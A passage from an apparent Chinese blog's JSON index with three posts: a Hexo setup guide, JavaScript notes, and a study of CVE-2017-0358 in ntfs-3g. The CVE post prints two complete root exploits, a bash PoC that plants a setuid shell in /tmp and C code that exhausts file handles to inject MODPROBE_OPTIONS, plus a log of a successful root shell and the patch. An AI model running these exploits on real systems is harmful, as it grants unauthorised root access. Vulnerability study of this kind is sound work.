上读代码的找到的,附上源码分析.","categories":[{"name":"杂货铺","slug":"杂货铺","permalink":"http://maskhed.github.io/categories/杂货铺/"}],"tags":[{"name":"Github","slug":"Github","permalink":"http://maskhed.github.io/tags/Github/"}]},{"title":"Hexo 搭建个人博客","slug":"Hexo博客搭建","date":"2018-10-21T14:09:55.000Z","updated":"2018-11-16T07:03:33.933Z","comments":true,"path":"2018/10/21/Hexo博客搭建/","link":"","permalink":"http://maskhed.github.io/2018/10/21/Hexo博客搭建/","excerpt":"积淀的意义不言而喻，希望能借助这个精神世界的自留地，沉淀所思所学，见证自己一步步走过的历程。","text":"积淀的意义不言而喻，希望能借助这个精神世界的自留地，沉淀所思所学，见证自己一步步走过的历程。 0x00 准备工作Hexo 是一个基于 Node.js 的静态博客框架，具有极速生成静态页面、支持Markdown、一键部署、插件丰富等优点。在使用 Hexo 之前，需要进行以下准备工作。 安装 Node.js，用以生成静态页面 安装 Git，用以提交管理博客 注册 Github 账号，并开启 Github Pages 服务 掌握 Markdown 语法，用以管理站点内容 以上内容资料较为丰富，因此不再赘述，如有需求请自行 Google。 0x01 Hexo1. 安装通过以下命令，一键安装 Hexo1npm install hexo -g 待安装完成后，创建用以存放 hexo 文件的目录，并初始化123mkdir hexocd hexohexo init 初始化成功后，目录结构如下：12345678.├── _config.yml├── package.json├── scaffolds├── source└── themes3 directories, 2 files 2. 常用命令123456789101112131415$ hexo server 开启hexo服务器$ hexo s$ hexo s --draft 显示草稿$ hexo new \"name\" 新建文章$ hexo new draft \"name\" 新建草稿$ hexo publish \"name\" 发布草稿$ hexo clean 清除缓存文件 (db.json) 和已生成的静态文件 (public)$ hexo generate 生成静态页面$ hexo g$ hexo deploy 部署博客到Github$ hexo d 3. Hexo 配置通过/_config.yml文件可对 Hexo 进行配置，官方文档中有详细介绍，不再赘述，详情可参考配置。 4. 添加文章摘要设置文章摘要有两种方法： 在 Front-matter 中指定 description，如： 12345678910title: Hello Worlddate: 2013-11-22 17:11:54description: 你对本页的描述``` * 在正文使用 `&lt;!--more--&gt;` 作为摘要的结束标记```bash以上是摘要 &lt;!--more--&gt;以下是剩下的全文 5. 自定义 404 、about 页面 在 hexo/source 目录下创建 404.html 文件 或者 404.md 文件，以 404.html 为例接入腾讯404公益广告。 123456789101112layout: falsetitle: \"404\"---&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta http-equiv=\"Content-Type\" content=\"text/html;charset=utf-8\"&gt; &lt;script type=\"text/javascript\" src=\"//qzonestyle.gtimg.cn/qzone/hybrid/app/404/search_children.js\" charset=\"utf-8\" homePageUrl=\"http://&lt;your home page&gt;\" homePageName=\"回到首页\"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt; 在 hexo/source/about/ 目录下创建 index.md文件，添加内容如下： 1234567891011---title: about---Coming soon ~``` ### 6. 创建分类及标签 6.1 创建“分类”选项打开命令行，进入博客所在目录。执行以下命令```bash$ hexo new page NewCategories 成功后提示：1INFO Created: ~/Documents/blog/source/NewCategories/index.md 生成的index.md内容如下：1234---title: 文章分类date: 2018-10-20 13:47:40--- 向文件中添加type: &quot;categories&quot;，结果如下：12345---title: 文章分类date: 2018-10-20 13:47:40type: \"categories\"--- 打开需要添加分类的文章，为其添加categories属性。下方的categories: web前端表示添加这篇文章到“web前端”这个分类。123456---title: jQuery对表单的操作及更多应用date: 2018-10-20 13:47:40categories:- web前端--- 至此，成功给文章添加分类，点击首页的“分类”可以看到该分类下的所有文章。当然，只有添加了categories: xxx的文章才会被收录到首页的“分类”中。 6.2 创建“标签”选项打开命令行，进入博客所在文件夹。执行命令1$ hexo new page NewTags 成功后会提示：1INFO Created: ~/Documents/blog/source/NewTags/index.md 打开index.md文件，内容如下：1234---title: 标签date: 2017-05-27 14:22:08--- 添加type: &quot;tags&quot;至index.md中：12345---title: 文章分类date: 2017-05-27 13:47:40type: \"tags\"--- 打开需要添加标签的文章，为其添加tags属性。12345678910---title: jQuery对表单的操作及更多应用date: 2017-05-26 12:12:57categories:- web前端tags:- jQuery- 表格- 表单验证--- 至此，成功给文章添加标签，点击首页的“标签”可以看到该标签下的所有文章。当然，只有添加了tags: xxx的文章才会被收录到首页的“标签”中。 修改scaffolds/post.md模板文件，在 Front-matter 区域添加tages:、categories:：123456---title: &#123;&#123; title &#125;&#125;date: &#123;&#123; date &#125;&#125;categories:tags:--- 之后执行hexo new 文章名命令生成的文件，将会自动添加“分类”与“标签”。 7. SEO优化Hexo 站点已基本搭建完成。但是如果仅仅搭建完毕是无法通过搜索引擎查询到的，若想要加入搜索引擎收录，需进行 SEO 优化。7.1 添加搜索引擎收录分别在 百度站长工具 和 Google 站长工具 中对站点进行验证。 选择文件验证的方式进行验证，把下载的文件放在 source 目录下，并对文件内容进行编辑，在文件首部加入如下内容：1234---layout: falsesitemap: false--- 这样就可以防止 Hexo 在生成博客网站时在验证文件里添加额外的内容，导致验证失败。也可以在博客的配置文件里加入如下的配置来防止这些文件被渲染：123skip_render: - baidu_verify*.html - google*.html 7.2 添加robots.txt在/source/下新建robots.txt：123456789101112131415161718User-agent: *Allow: /Allow: /archives/Allow: /about/Allow: /categories/Allow: /donate/Allow: /2017/Allow: /history/Allow: /message/Allow: /page/Allow: /tags/Disallow: /vendors/Disallow: /vendors/Disallow: /fancybox/Sitemap: https://domain/sitemap.xmlSitemap: https://domain/baidusitemap.xml 7.3 提交 sitemaps利用插件生成sitemap（详见下文），待站点验证成功后便可以选择用 sitemap 的方式自动提交链接。提交完成后可以通过 site:your-blog-site 验证站点是否被百度、Google 收录。 一般需要几天的时间才能保证被搜索引擎收录。 0x02 MaupassantHexo官网提供了丰富的 Themes，选定心仪的主题之后，可以参照主题的文档进行安装，之后修改/_conifg.yml进行配置，本站选用了Maupassant。 1. Maupassant 安装安装主题和渲染器：123$ git clone https://github.com/tufu9441/maupassant-hexo.git themes/maupassant$ npm install hexo-renderer-pug --save$ npm install hexo-renderer-sass --save 编辑Hexo目录下的 _config.yml，将theme的值改为maupassant。 注：安装npm install hexo-renderer-sass时报错，切换至淘宝NPM镜像安装即可。 2. Maupassant配置官方文档中有详细介绍，可参考中文介绍。 3. 显示文章目录在文章的 Front-matter 中添加toc: true就可以让该篇文章显示目录，可以修改 hexo/scaffolds/post.md 模板文件，这样之后创建的文章默认都显示文章目录。1234567---title: &#123;&#123; title &#125;&#125;date: &#123;&#123; date &#125;&#125;categories:tags:toc: true--- 4. 开启 canvas-nest 网页动态背景修改/themes/maupassant/_config.yml:123456canvas_nest: enable: true color: 208,55,66 ## RGB value of the color opacity: 0.3 ## Transparency of lines zIndex: -1 ## The z-index property of the background count: 99 ## Quantity of lines 5. 设置导航栏menu修改/themes/maupassant/_config.yml:12345678910111213141516menu: - page: home directory: . icon: fa-home - page: archive directory: archives/ icon: fa-archive - page: about directory: about/ icon: fa-user - page: history directory: history/ icon: fa-user - page: rss directory: atom.xml icon: fa-rss 6. 为导航添加相应的页面（时间轴等） 在/source下新建与page名称对应的文件夹，然后在文件夹中建立index.md文件； 在index.md的front-matter中设置属性，若需要含有侧边栏的页面，添加layout: page；若需要单栏页面，就将layout设置为 layout: single-column；若不需要评论，需要加上comments: false 若要显示时间轴，在index.md的front-matter中设置layout属性为layout: timeline，同时修改/themes/maupassant/_config.yml: 123456789timeline: - num: 1 word: 2014/06/12-Start - num: 2 word: 2014/11/29-XXX - num: 3 word: 2015/02/18-DDD - num: 4 word: More /source/history/index.md：1234---layout: timelinecomments: false--- 0x03 常用插件1. hexo-wordcount安装插件1$ npm install hexo-wordcount —save 开启 Maupassant 主题中的 Word Count 功能：1wordcount: true ## If you want to display the word counter and the reading time expected to spend of each post please set the value to true, and you must have hexo-wordcount installed. 2. hexo-generator-search启用 Maupassant 本地搜索功能，安装hexo-generator-search1npm install hexo-generator-search --save 安装完成后，修改主题配置，显示本地搜索框1self_search: true ## Use a jQuery-based local search engine, true/false. 3. hexo-asset-imagehexo对本地图片的支持并不友好，如果按markdown的语法写部署之后页面的图片取不到，如果按hexo的写法在本地markdown编辑器中又不能识别，解决办法是使用 hexo-asset-image 插件。首先安装插件1$ npm install hexo-asset-image —save 然后修改 _config.yml 中 post_asset_folder 的值为 true，这样每次创建文章的时候会生成一个同名文件夹用于放资源文件，这样就可以使用markdown的语法来插入图片了。 4. hero-generator-feed支持 RSS 订阅，安装 hexo-generator-feed1npm install hexo-generator-feed --save 修改 hexo 配置123456feed: type: atom path: atom.xml limit: 5 #在feed中出现的最大文章数（使用0或者false）来显示所有文章 hub: content: 修改主题配置123- page: rss directory: atom.xml icon: fa-rss 5. 生成站点地图通过站点地图生成插件生成sitemap，进行SEO优化。 安装插件 12npm install hexo-generator-sitemap --savenpm install hexo-generator-baidu-sitemap --save 生成站点地图,修改/_config.yml文件，添加如下配置： # 自动生成sitemap sitemap: path: sitemap.xml baidusitemap: path: baidusitemap.xml 编译hexo g，在 public 目录下可以看到sitemap.xml和baidusitemap.xml文件，重新发布至服务器hexo d。 0x04 未完待续 待站点被收录后，上传sitemap.xml； 显示分类文章总数(目测有难度) 开启评论","categories":[{"name":"杂货铺","slug":"杂货铺","permalink":"http://maskhed.github.io/categories/杂货铺/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"http://maskhed.github.io/tags/Hexo/"}]},{"title":"CVE-2017-0358","slug":"CVE-2017-0358","date":"2018-10-21T07:23:44.000Z","updated":"2018-11-10T03:47:18.451Z","comments":true,"path":"2018/10/21/CVE-2017-0358/","link":"","permalink":"http://maskhed.github.io/2018/10/21/CVE-2017-0358/","excerpt":"CVE-2017-0358，Linux本地提权漏洞。","text":"CVE-2017-0358，Linux本地提权漏洞。 0x00 ntfs-3g (Debian 9) - Privilege Escalation 最近研究了下CVE-2017-0358，Linux下的本地提权漏洞，记录下学习历程。最初是在exploit-db上发现该漏洞ntfs-3g (Debian 9) - Privilege Escalation，并附有EXP，在简单学习了FUSE、NTFS-3G等基础概念后尝试利用作者给出的EXP复现漏洞。EXP如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#!/bin/bashecho \"@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\"echo \"@ CVE-2017-0359, PoC by Kristian Erik Hermansen @\"echo \"@ ntfs-3g local privilege escalation to root @\"echo \"@ Credits to Google Project Zero @\"echo \"@ Affects: Debian 9/8/7, Ubuntu, Gentoo, others @\"echo \"@ Tested: Debian 9 (Stretch) @\"echo \"@ Date: 2017-02-03 @\"echo \"@ Link: https://goo.gl/A9I8Vq @\"echo \"@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\"echo \"[*] Gathering environment info ...\"cwd=\"$(pwd)\"un=\"$(uname -r)\"dlm=\"$(pwd)/lib/modules\"dkf=\"$(pwd)/kernel/fs\"echo \"[*] Creating kernel hijack directories ...\"mkdir -p \"$&#123;dlm&#125;\"mkdir -p \"$&#123;dkf&#125;\"echo \"[*] Forging symlinks ...\"ln -sf \"$&#123;cwd&#125;\" \"$&#123;dlm&#125;/$&#123;un&#125;\"ln -sf \"$&#123;cwd&#125;\" \"$&#123;dkf&#125;/fuse\"ln -sf cve_2017_0358.ko fuse.koecho \"[*] Pulling in deps ... \"echo \"[*] Building kernel module ... \"cat &lt;&lt; 'EOF' &gt; cve_2017_0358.c#include &lt;linux/module.h&gt;MODULE_LICENSE(\"CC\");MODULE_AUTHOR(\"kristian erik hermansen &lt;kristian.hermansen+CVE-2017-0358@gmail.com&gt;\");MODULE_DESCRIPTION(\"PoC for CVE-2017-0358 from Google Project Zero\");int init_module(void) &#123; printk(KERN_INFO \"[!] Exploited CVE-2017-0358 successfully; may want to patch your system!\\n\"); char *envp[] = &#123; \"HOME=/tmp\", NULL &#125;; char *argv[] = &#123; \"/bin/sh\", \"-c\", \"/bin/cp /bin/sh /tmp/r00t; /bin/chmod u+s /tmp/r00t\", NULL &#125;; call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC); char *argvv[] = &#123; \"/bin/sh\", \"-c\", \"/sbin/rmmod cve_2017_0358\", NULL &#125;; call_usermodehelper(argv[0], argvv, envp, UMH_WAIT_EXEC); return 0;&#125;void cleanup_module(void) &#123; printk(KERN_INFO \"[*] CVE-2017-0358 exploit unloading ...\\n\");&#125;EOFcat &lt;&lt; 'EOF' &gt; Makefileobj-m += cve_2017_0358.oall: make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modulesclean: make -C /lib/modules/$(shell uname -r)/build M=$(PWD) cleanEOFmake 1&gt;/dev/null 2&gt;/dev/null || echo \"[-] FAILED: your need make / build tools\"cp \"/lib/modules/$&#123;un&#125;/modules.dep.bin\" . || echo \"[-] FAILED: linux-image location non-default?\"MODPROBE_OPTIONS=\"-v -d $&#123;cwd&#125;\" ntfs-3g /dev/null /dev/null 1&gt;/dev/null 2&gt;/dev/null/tmp/r00t -c 'whoami' | egrep -q 'root' &amp;&amp; echo \"[+] SUCCESS: You have root. Don't be evil :)\"/tmp/r00t 疑惑的是无论如何测试，始终不成功，最后怀疑是modprobe函数的问题，查看官方文档，给出如下解释： The modprobe command silently succeeds with an exit status of 0 if it successfully loads the module, or the module is already loaded into the kernel.Thus, you must ensure that the module is not already loaded before attempting to load it with custom parameters. The modprobe command does not automatically reload the module, or alert you that it is already loaded. 也就是说，无法解决在系统已加载FUSE模块的前提下重新加载FUSE，并使临时参数生效的问题。黔驴技穷，于是发邮件给作者，作（骗）者（子）赤果果的say：“need additional modification，you have to make me an offer”,shit… （注：jannh已在www.exploit-db.com上发布有效版本，ntfs-3g - Unsanitized modprobe Environment Privilege Escalation） 0x01 ntfs-3g: modprobe is executed with unsanitized environment 在经历过艰苦的search之后，终于发现了漏洞的真正作者project zero的jannh(ntfs-3g: modprobe is executed with unsanitized environment)。 漏洞存在于NTFS-3G之中，该程序是由Tuxera公司开发并维护的开源项目，目的是为Linux提供NTFS分区的驱动程序，实现对NTFS文件系统的读写。该程序默认安装在Ubuntu等操作系统中，并且赋予了setuid的权限。作者解释到CVE-2017-0358的根源在于，NTFS-3G在调用modprobe时没有初始化环境变量，致使存在本地提权的风险。漏洞存在于load_fuse_module ()函数之中： 1234567891011121314151617181920212223242526272829303132static fuse_fstype load_fuse_module(void)&#123; int i; struct stat st; pid_t pid; const char *cmd = \"/sbin/modprobe\"; struct timespec req = &#123; 0, 100000000 &#125;; /* 100 msec */ fuse_fstype fstype; if (!stat(cmd, &amp;st) &amp;&amp; !geteuid()) &#123; pid = fork(); if (!pid) &#123; execl(cmd, cmd, \"fuse\", NULL); _exit(1); &#125; else if (pid != -1) waitpid(pid, NULL, 0); &#125; for (i = 0; i &lt; 10; i++) &#123; /* * We sleep first because despite the detection of the loaded * FUSE kernel module, fuse_mount() can still fail if it's not * fully functional/initialized. Note, of course this is still * unreliable but usually helps. */ nanosleep(&amp;req, NULL); fstype = get_fuse_fstype(); if (fstype != FSTYPE_NONE) break; &#125; return fstype;&#125; 当NTFS-3G被调用时，利用get_fuse_fstype()检测当前系统是否加载FUSE模块，若未加载，则利用load_fuse_module()中的modprobe，加载FUSE模块。 1234567891011121314151617181920212223static fuse_fstype get_fuse_fstype(void)&#123; char buf[256]; fuse_fstype fstype = FSTYPE_NONE; FILE *f = fopen(\"/proc/filesystems\", \"r\"); if (!f) &#123; ntfs_log_perror(\"Failed to open /proc/filesystems\"); return FSTYPE_UNKNOWN; &#125; while (fgets(buf, sizeof(buf), f)) &#123; if (strstr(buf, \"fuseblk\\n\")) &#123; fstype = FSTYPE_FUSEBLK; break; &#125; if (strstr(buf, \"fuse\\n\")) fstype = FSTYPE_FUSE; &#125; fclose(f); return fstype;&#125; 问题在于，modprobe的设计初衷并不是运行在一个setuid的环境当中，而NTFS-3G却需要setuid的权限。在modprobe的man文档中明确指出： The MODPROBE_OPTIONS environment variable can also be used to pass arguments to modprobe. 因此，在一个尚未加载FUSE 的系统中，攻击者可以通过设置环境变量MODPROBE_OPTIONS “-C /tmp/evil_config -d /tmp/evil_root”，强制modprobe加载恶意配置文件，导致攻击者具备加载任意代码到系统内核的能力。 在现实情况中，FUSE在大部分系统中已被作为内核的一部分，基本都处于已加载的状态，也就是文章伊始提到的问题。 jannh对这个问题给出了一种解决思路，通过耗尽系统范围内所有进程可以打开的文件句柄的数量 (/proc/sys/fs/file-max)，使得NTFS-3G在fopen(&quot;/proc/filesystems&quot;, &quot;r&quot;)时异常，导致get_fuse_fstype()返回FSTYPE_UNKNOWN，在主函数中触发load_fuse_module()函数。 123456789101112fstype = get_fuse_fstype();err = NTFS_VOLUME_NO_PRIVILEGE;if (restore_privs()) goto err_out;if (fstype == FSTYPE_NONE || fstype == FSTYPE_UNKNOWN) fstype = load_fuse_module();create_dev_fuse();if (drop_privs()) goto err_out; 0x02 Attack jannh给出了EXP，通过测试成功在Ubuntu Server 16.10、kali 4.3中实现提权，在Debian 8中测试失败。测试如下：（注：在VM中测试时，需要多CPU的支持） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647user@ubuntu:~$ tar xf ntfs-3g-modprobe-unsafe.taruser@ubuntu:~$ cd ntfs-3g-modprobe-unsafe/user@ubuntu:~/ntfs-3g-modprobe-unsafe$ ./compile.shmake: Entering directory '/usr/src/linux-headers-4.8.0-32-generic' CC [M] /home/user/ntfs-3g-modprobe-unsafe/rootmod.o Building modules, stage 2. MODPOST 1 modules CC /home/user/ntfs-3g-modprobe-unsafe/rootmod.mod.o LD [M] /home/user/ntfs-3g-modprobe-unsafe/rootmod.komake: Leaving directory '/usr/src/linux-headers-4.8.0-32-generic'depmod: WARNING: could not open /home/user/ntfs-3g-modprobe-unsafe/depmod_tmp//lib/modules/4.8.0-32-generic/modules.order: No such file or directorydepmod: WARNING: could not open /home/user/ntfs-3g-modprobe-unsafe/depmod_tmp//lib/modules/4.8.0-32-generic/modules.builtin: No such file or directoryuser@ubuntu:~/ntfs-3g-modprobe-unsafe$ ./sploitlooks like we won the racegot ENFILE at 198088 totalFailed to open /proc/filesystems: Too many open files in system yay, modprobe ran!modprobe: ERROR: ../libkmod/libkmod.c:514 lookup_builtin_file() could not open builtin file '/tmp/ntfs_sploit.u48sGO/lib/modules/4.8.0-32-generic/modules.builtin.bin'modprobe: ERROR: could not insert 'rootmod': Too many levels of symbolic linksError opening '/tmp/ntfs_sploit.u48sGO/volume': Is a directoryFailed to mount '/tmp/ntfs_sploit.u48sGO/volume': Is a directorywe have root privs now...root@ubuntu:~/ntfs-3g-modprobe-unsafe# iduid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lxd),123(libvirt),127(sambashare),128(lpadmin),1000(user) 0x03 Code: Exploit.c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176int main(void) &#123;/* prevent shell from backgrounding ntfs-3g when stopped */pid_t initial_fork_child = fork();if (initial_fork_child == -1) err(1, \"initial fork\");if (initial_fork_child != 0) &#123; int status; if (waitpid(initial_fork_child, &amp;status, 0) != initial_fork_child) err(1, \"waitpid\"); execl(\"rootshell\", \"rootshell\", NULL); exit(0);&#125;char buf[1000] = &#123;0&#125;;// Set up workspace with volume, mountpoint, modprobe config and module directory.char template[] = \"/tmp/ntfs_sploit.XXXXXX\";if (mkdtemp(template) == NULL) err(1, \"mkdtemp\");char volume[100], mountpoint[100], modprobe_confdir[100], modprobe_conffile[100];sprintf(volume, \"%s/volume\", template);sprintf(mountpoint, \"%s/mountpoint\", template);sprintf(modprobe_confdir, \"%s/modprobe.d\", template);sprintf(modprobe_conffile, \"%s/sploit.conf\", modprobe_confdir);if (mkdir(volume, 0777) || mkdir(mountpoint, 0777) || mkdir(modprobe_confdir, 0777)) err(1, \"mkdir\");int conffd = open(modprobe_conffile, O_WRONLY|O_CREAT, 0666);if (conffd == -1) err(1, \"open modprobe config\");int suidfile_fd = open(\"rootshell\", O_RDONLY);if (suidfile_fd == -1) err(1, \"unable to open ./rootshell\");char modprobe_config[200];sprintf(modprobe_config, \"alias fuse rootmod\\noptions rootmod suidfile_fd=%d\\n\", suidfile_fd);if (write(conffd, modprobe_config, strlen(modprobe_config)) != strlen(modprobe_config)) errx(1, \"modprobe config write failed\");close(conffd);// module directory setupchar system_cmd[1000];sprintf(system_cmd, \"mkdir -p %s/lib/modules/$(uname -r) &amp;&amp; cp rootmod.ko *.bin %s/lib/modules/$(uname -r)/\", template, template);if (system(system_cmd)) errx(1, \"shell command failed\");// Set up inotify watch for /proc/mounts.// Note: /proc/mounts is a symlink to /proc/self/mounts, so// the watch will only see accesses by this process.int inotify_fd = inotify_init1(IN_CLOEXEC);if (inotify_fd == -1) err(1, \"unable to create inotify fd?\");if (inotify_add_watch(inotify_fd, \"/proc/mounts\", IN_OPEN) == -1) err(1, \"unable to watch /proc/mounts\");// Set up inotify watch for /proc/filesystems.// This can be used to detect whether we lost the race.int fs_inotify_fd = inotify_init1(IN_CLOEXEC);if (fs_inotify_fd == -1) err(1, \"unable to create inotify fd?\");if (inotify_add_watch(fs_inotify_fd, \"/proc/filesystems\", IN_OPEN) == -1) err(1, \"unable to watch /proc/filesystems\");// Set up inotify watch for /sbin/modprobe.// This can be used to detect when we can release all our open files.int modprobe_inotify_fd = inotify_init1(IN_CLOEXEC);if (modprobe_inotify_fd == -1) err(1, \"unable to create inotify fd?\");if (inotify_add_watch(modprobe_inotify_fd, \"/sbin/modprobe\", IN_OPEN) == -1) err(1, \"unable to watch /sbin/modprobe\");int do_exec_pipe[2];if (pipe2(do_exec_pipe, O_CLOEXEC)) err(1, \"pipe\");pid_t child = fork();if (child == -1) err(1, \"fork\");if (child != 0) &#123; if (read(do_exec_pipe[0], buf, 1) != 1) errx(1, \"pipe read failed\"); char modprobe_opts[300]; sprintf(modprobe_opts, \"-C %s -d %s\", modprobe_confdir, template); setenv(\"MODPROBE_OPTIONS\", modprobe_opts, 1); execlp(\"ntfs-3g\", \"ntfs-3g\", volume, mountpoint, NULL);&#125;child = getpid();// Now launch ntfs-3g and wait until it opens /proc/mountsif (write(do_exec_pipe[1], buf, 1) != 1) errx(1, \"pipe write failed\");if (read(inotify_fd, buf, sizeof(buf)) &lt;= 0) errx(1, \"inotify read failed\");if (kill(getppid(), SIGSTOP)) err(1, \"can't stop setuid parent\");// Check whether we won the main race.struct pollfd poll_fds[1] = &#123;&#123; .fd = fs_inotify_fd, .events = POLLIN&#125;&#125;;int poll_res = poll(poll_fds, 1, 100);if (poll_res == -1) err(1, \"poll\");if (poll_res == 1) &#123; puts(\"looks like we lost the race\"); if (kill(getppid(), SIGKILL)) perror(\"SIGKILL after lost race\"); char rm_cmd[100]; sprintf(rm_cmd, \"rm -rf %s\", template); system(rm_cmd); exit(1);&#125;puts(\"looks like we won the race\");// Open as many files as possible. Whenever we have// a bunch of open files, move them into a new process.int total_open_files = 0;while (1) &#123; #define LIMIT 500 int open_files[LIMIT]; bool reached_limit = false; int n_open_files; for (n_open_files = 0; n_open_files &lt; LIMIT; n_open_files++) &#123; open_files[n_open_files] = eventfd(0, 0); if (open_files[n_open_files] == -1) &#123; if (errno != ENFILE) err(1, \"eventfd() failed\"); printf(\"got ENFILE at %d total\\n\", total_open_files); reached_limit = true; break; &#125; total_open_files++; &#125; pid_t fd_stasher_child = fork(); if (fd_stasher_child == -1) err(1, \"fork (for eventfd holder)\"); if (fd_stasher_child == 0) &#123; prctl(PR_SET_PDEATHSIG, SIGKILL); // close PR_SET_PDEATHSIG race window if (getppid() != child) raise(SIGKILL); while (1) pause(); &#125; for (int i = 0; i &lt; n_open_files; i++) close(open_files[i]); if (reached_limit) break;&#125;// Wake up ntfs-3g and keep allocating files, then free up// the files as soon as we're reasonably certain that either// modprobe was spawned or the attack failed.if (kill(getppid(), SIGCONT)) err(1, \"SIGCONT\");time_t start_time = time(NULL);while (1) &#123; for (int i=0; i&lt;1000; i++) &#123; int efd = eventfd(0, 0); if (efd == -1 &amp;&amp; errno != ENFILE) err(1, \"gapfiller eventfd() failed unexpectedly\"); &#125; struct pollfd modprobe_poll_fds[1] = &#123;&#123; .fd = modprobe_inotify_fd, .events = POLLIN &#125;&#125;; int modprobe_poll_res = poll(modprobe_poll_fds, 1, 0); if (modprobe_poll_res == -1) err(1, \"poll\"); if (modprobe_poll_res == 1) &#123; puts(\"yay, modprobe ran!\"); exit(0); &#125; if (time(NULL) &gt; start_time + 3) &#123; puts(\"modprobe didn't run?\"); exit(1); &#125;&#125;&#125; 0x04 补丁代码，load_fuse_module()函数 http://seclists.org/oss-sec/2017/q1/307 123456789101112131415 struct stat st; pid_t pid; const char *cmd = \"/sbin/modprobe\";+ char *env = (char*)NULL; struct timespec req = &#123; 0, 100000000 &#125;; /* 100 msec */ fuse_fstype fstype; if (!stat(cmd, &amp;st) &amp;&amp; !geteuid()) &#123; pid = fork(); if (!pid) &#123;- execl(cmd, cmd, \"fuse\", NULL);+ execle(cmd, cmd, \"fuse\", NULL, &amp;env); _exit(1); &#125; else if (pid != -1) waitpid(pid, NULL, 0);","categories":[{"name":"CVE分析","slug":"CVE分析","permalink":"http://maskhed.github.io/categories/CVE分析/"}],"tags":[{"name":"CVE","slug":"CVE","permalink":"http://maskhed.github.io/tags/CVE/"}]},{"title":"JS学习笔记","slug":"JS-study","date":"2017-05-03T12:08:58.000Z","updated":"2018-11-10T03:49:56.765Z","comments":true,"path":"2017/05/03/JS-study/","link":"","permalink":"http://maskhed.github.io/2017/05/03/JS-study/","excerpt":"记录在学习 JavaScript 过程中的点点滴滴。","text":"记录在学习 JavaScript 过程中的点点滴滴。 一、在HTML中使用JS&lt;script>元素，HTML 4.01为&lt;/script>定义了以下6个属性： async:可选。表示应该立即下载脚本，但不应该妨碍页面中的其他操作，只对外部脚本文件有效。charset:可选。表示通过src属性指定的代码的字符集。defer:可选。表示脚本可以延迟到文档完全被解析和显示之后再执行，只对外部脚本文件有效。src:可选。表示包含要执行代码的外部文件。type:可选。表示编写代码使用的脚本语言的内容类型（MIME）。 二、基本概念JS的语法大量借鉴了C及其他类C语言的语法，有C语言基础的同学在倍感亲切的同时，一定要注意JS与C的差异。 区分大小写：JS中的一切（变量、函数名、操作符）都区分大小写。 标识符（变量、函数、属性的名字）：第一个字符必须是一个字母、下划线(_)或美元符号($)。 变量：JS的变量为弱类型 按照惯例，JS标识符采用驼峰大小写格式，也就是第一个字母小写，剩下的每个单词的首字母大写。 数据类型 JS具有5种简单类型(Undefined、Null、Boolean、Number、String)和1种复杂类型（Object），Object本质上是由一组无序的名值对组成的。 Object类型是所有它的实例的基础，它的每个实例都具备下列属性和方法： constructor:保存着用于创建当前对象的函数。hasOwnProperty(propertyName):用于检查给定的属性在当前对象的实例中是否存在。isPrototypeOf(object):用于检查传入的对象是否是当前对象的原型。propertyIsEnumerable(propertyName):用于检查给定的属性是否能够使用for-in 语句枚举。toLocaleString():返回对象的字符串表示，该字符串与执行环境的地区相对应。toString():返回对象的字符串表示。valueOf():返回对象的字符串、数值或布尔值表示。通常与toString（）方法的返回值一致。 语句 1.for-in语句:一种精准的迭代语句，可以用来枚举对象的属性。语法如下： for (var propName in expression) statement 下面是一个示例： 123for (var propName in window) &#123; document.write(propName);&#125; 在这个例子中，枚举了BOM中window对象的所有属性，直到对象中的所有属性都被枚举一遍为止。 2.label语句：在代码中添加标签，以便以后使用，一般配合for、break或continue语句引用。语法如下： label: statement 示例： 12345678910111213var num = 0;outermost:for (var i=0; i &lt; 10; i++) &#123; for (var j=0; j &lt; 10; j++) &#123; if (i ==5 &amp;&amp; j==5) &#123; break outermost; &#125; num++; &#125;&#125;alert(num); //55 12345678910111213var num = 0;outermost:for (var i=0; i &lt; 10; i++) &#123; for (var j=0; j &lt; 10; j++) &#123; if (i ==5 &amp;&amp; j==5) &#123; continue outermost; &#125; num++; &#125;&#125;alert(num); //95 3.with 语句：将代码的作用域设置到一个特定对象之中。语法： with (expression) statement; 示例：123456789var qs = location.search.substring(1);var hostName = location.hostname;var url = location.href;with(location)&#123; var qs = search.substring(1); var hostName = hostname; var url = href;&#125; 注：严格模式下不允许使用with语句。大量使用with语句将会导致性能下降。 4.理解参数JS函数的参数与大多数其他语言中的参数有所不同。JS函数不介意传递进来多少个参数，也不在乎传递过来的参数是什么类型。也就是说，即便你定义的函数只接收两个参数，在调用这个函数时也未必一定要传递两个参数。可以传递一个、三个甚至不传递参数，而解析器永远不会有什么怨言。之所以会这样，是因为JS中的参数在内部是用一个数组表示的。函数接收到的始终是这个数组，而不关心数组中包含哪些参数。实际上，在函数体内可以通过arguments对象来访问这个参数数组，从而获取传递给函数的每一个参数。 小结 JS中的基本数据类型包括Undefined、Null、Boolean、Number和String。 与其他语言不同，JS没有为整数和浮点数分别定义不同的数据类型，Number类型可用于表示所有数值。 JS也有一种复杂数据类型，即Object类型，该类型是这门语言中所有对象的基础类型。 严格模式为这门语言中容易出错的地方施加了限制。 JS提供了很多与C及其他类C语言中相同的基本操作符，包括算数操作符、布尔操作符、关系操作符、相等操作符及赋值操作符等。 JS从其他语言中借鉴了很多流控制语句，例如if语句、for语句和switch语句等。 JS中的函数与其他语言中的函数有诸多不同之处。 无需指定函数的返回值，因为任何JS函数都可以在任何时候返回任何值。 实际上，未指定返回值的函数返回的是一个特殊的Undefined值。 JS中也没有函数签名的概念，因为其函数参数是以一个包含零或多个值的数组的形式传递的。 可以向JS函数传递任意数量的参数，并且可以通过arguments对象来访问这些参数。 